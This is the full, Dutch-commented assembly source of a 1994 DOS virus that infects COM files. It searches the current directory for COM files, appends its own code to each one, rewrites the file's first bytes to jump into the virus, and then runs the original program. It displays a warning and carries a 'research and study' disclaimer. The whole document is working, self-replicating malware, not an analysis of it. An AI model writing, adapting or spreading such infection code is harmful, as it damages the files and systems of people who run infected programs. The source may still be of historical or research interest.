; Com-infector ...

        IDEAL                                           ; Informatie voor de
        MODEL SMALL                                     ; assembler (TASM)
        CODESEG                                         ; om een COM file
        ORG     100h                                    ; te genereren.

        VX_LEN  EQU ((NEW_BYTES + 2) - VX)              ; Aantal bytes dat
                                                        ; dit virus groot is.
FIRST:
        DB      0FBh                                    ; Markering dat deze
                                                        ; file geinfecteerd
                                                        ; is.
        DB      0E9h                                    ; Een 3-bytes ge-
        DW      00000h                                  ; infecteerde file.

VX:     CALL    RELATIVE                                ; Zet die offset van
RELATIVE:                                               ; RELATIVE in BP,
        POP     BP                                      ; trekt daar de positie
        SUB     BP,OFFSET RELATIVE                      ; van RELATIVE af in
                                                        ; de originele file
                                                        ; (deze file),
                                                        ; en zo kan de relative
                                                        ; positie van de data
                                                        ; in het geheugen
                                                        ; bepaalt worden.
        MOV     AH,009h                                 ; Laat waarschuwing
        LEA     DX,[BP + MEDEDELING]                    ; zien.
        INT     021h                                    ;
        LEA     SI,[BP + OLD_BYTES]                     ; Plaatste de eerste 3
        MOV     DI,0100h                                ; bytes van de ge-
        CLD                                             ; infecteerde file
        MOVSW                                           ; terug.
        MOVSW                                           ;
        MOV     AH,02Fh                                 ; Bewaar de pointer
        INT     021h                                    ; naar het DTA blok.
        MOV     [WORD PTR CS:BP + OLD_DTA    ],BX       ;
        MOV     [WORD PTR CS:BP + OLD_DTA + 2],ES       ;
        MOV     AH,01Ah                                 ; Zet die pointer naar
        LEA     DX,[BP + NEW_DTA]                       ; het DTA blok van dit
        INT     021h                                    ; virus.

        MOV     AH,04Eh                                 ; Zoek de eerste COM
        MOV     CX,022h                                 ; file in deze
        LEA     DX,[BP + FILE_NAME]                     ; directory.
        JMP     FIND                                    ;

AGAIN:  MOV     AH,04Fh                                 ; Volgende COM file.

FIND:   INT     021h                                    ; Zoek, en als er
        JC      EXIT                                    ; geen COM files meer
                                                        ; in deze directory
                                                        ; zijn, dan naar EXIT.
        MOV     AX,03D02h                               ; Open de te infecteren
        LEA     DX,[BP + NEW_DTA + 30]                  ; file, en plaats de
        INT     021h                                    ; file handle in BX.
        MOV     BX,AX                                   ;
        MOV     AH,03Fh                                 ; Lees de eerste 4
        MOV     CX,00004h                               ; bytes in.
        LEA     DX,[BP + OLD_BYTES]                     ;
        MOV     DI,DX                                   ;
        INT     021h                                    ;

        CMP     [BYTE PTR DI],0FBh                      ; Is de eerste byte FB
        JE      AGAIN                                   ; dan naar AGAIN.
        MOV     AX,04202h                               ; Ga naar 't einde
        XOR     CX,CX                                   ; van de file.
        XOR     DX,DX                                   ;
        INT     021h                                    ;

        OR      DX,DX                                   ; Als de file grote is
        JNZ     AGAIN                                   ; dat een segment niet
                                                        ; infecteren, want dan
                                                        ; kan het geen COM
                                                        ; file zijn.
                                                        ; (Terug naar AGAIN)
        CMP     AX,1024                                 ; Is de file kleiner
        JB      AGAIN                                   ; dan 1024, dan naar
NOT_2_SMALL:                                            ; AGAIN.

        CMP     AX,50000                                ; Ook groter dan 50000
        JA      AGAIN                                   ; infecteren we niet.
                                                        ; (dan terug naar AGAIN)
        SUB     AX,00004h                               ; Bereken waar die jump
        MOV     [WORD PTR CS:BP + NEW_BYTES + 2],AX     ; aan het begin van de
                                                        ; geinfecteerde file
                                                        ; heen moet springen.
        MOV     AH,040h                                 ; Append 't virus
        MOV     CX,VX_LEN                               ; aan de file.
        LEA     DX,[BP + VX]                            ;
        INT     021h                                    ;

        MOV     AX,04200h                               ; Ga naar 't begin van
        XOR     CX,CX                                   ; de file.
        XOR     DX,DX                                   ;
        INT     021h                                    ;
        MOV     AH,040h                                 ; Schrijf de markering
        MOV     CX,00004h                               ; en de jump naar 't
        LEA     DX,[BP + NEW_BYTES]                     ; virus aan 't begin
        INT     021h                                    ; van de file.

        MOV     AH,03Eh                                 ; Sluit de file.
        INT     021h                                    ;
        JMP     AGAIN                                   ; Spring naar AGAIN.

EXIT:
        PUSH    DS                                      ; Save DS.
        MOV     DX,[WORD PTR CS:BP + OLD_DTA    ]
        MOV     AX,[WORD PTR CS:BP + OLD_DTA + 2]
        MOV     DS,AX
        MOV     AH,01Ah
        INT     021h
        POP     DS                                      ; Restore DS.
        MOV     SI,0100h                                ; Start de originele
        JMP     SI                                      ; file op.

; *** Data ***

Mededeling:

DB "This file contains a virus!!! Please COLD-boot from a write protected"
DB 00Dh, 00Ah
DB "system disk and use you anti virus software!!!$"

Disclaimer:

DB "Dit virus is ter RESEARCH en STUDIE geschreven!! "
DB "Misbruik hiervan is strafbaar onder de Nederlandse wet!! "

Auteur:

DB "(C) 1994 - [D‡RkR‡Y] retired virus writer..."

OLD_BYTES:      NOP
                NOP
                NOP
                RET

FILE_NAME:      DB      "*.COM",0h

NEW_BYTES       DB      0FBh, 0E9h, ?, ?

OLD_DTA         DW      ?, ?
NEW_DTA         DW      34 DUP(?)

        END     FIRST
